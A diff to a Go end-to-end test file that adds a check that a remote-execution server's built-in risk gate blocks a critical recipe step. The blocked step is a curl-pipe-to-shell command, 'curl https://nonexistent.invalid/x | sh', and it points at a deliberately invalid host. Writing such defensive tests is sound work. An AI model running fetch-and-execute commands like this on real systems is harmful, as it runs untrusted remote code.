@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 
@@ -289,6 +290,57 @@ deny_reason := "host blocked by inventory" if {
 	if _, err := target.readFile(t, out); err == nil {
 		t.Fatal("inventory-blocked host must not run the command")
 	}
+}
+
+// --- command risk gate: built-in critical hard-deny ----------------------
+
+func TestOPAE2E_CueExec_CommandRiskCritical(t *testing.T) {
+	target := newSSHTarget(t)
+	client := &http.Client{Timeout: 30 * time.Second}
+
+	// curl|sh is a built-in critical pattern. The invalid host keeps it harmless
+	// even in the impossible case the gate let it run; we assert it is blocked.
+	dir := t.TempDir()
+	recipePath := filepath.Join(dir, "risk.cue")
+	cue := `
+recipe: {
+	name: "opa-risk-critical"
+	steps: [
+		{ host: "*", command: "curl https://nonexistent.invalid/x | sh" },
+	]
+}
+`
+	require.NoError(t, os.WriteFile(recipePath, []byte(cue), 0o600))
+	configPath := filepath.Join(dir, "honey.yaml")
+	require.NoError(t, os.WriteFile(configPath, []byte(""), 0o600))
+
+	// No enforcer: built-in critical deny must fire on its own.
+	base := newTestServer(t, webserver.Options{
+		Token:          "test-token",
+		ConfigPath:     configPath,
+		SearchRegistry: target.searchReg,
+		ExecRegistry:   target.execReg,
+		Config: &config.File{
+			Apps:     map[string]apps.AppConfig{"opa_app": {Type: apps.AppTypeRecipe, TargetRecipe: recipePath, Target: "ssh-test"}},
+			Defaults: config.Defaults{SSHUser: "testuser"},
+		},
+	})
+
+	resp := postCueExec(t, client, base, recipePath, []hosts.Record{target.rec}, nil,
+		map[string]string{"Authorization": authHeader()})
+	defer resp.Body.Close()
+	require.Equal(t, http.StatusOK, resp.StatusCode)
+
+	results := decodeResults(t, resp)
+	var blocked bool
+	for _, r := range results {
+		skipped, _ := r["Skipped"].(bool)
+		out, _ := r["Output"].(string)
+		if skipped && strings.Contains(out, "command risk") {
+			blocked = true
+		}
+	}
+	assert.True(t, blocked, "critical command must be blocked by the risk gate: %v", results)
 }
 
 // --- Task 5: opa step (allow & deny) -------------------------------------
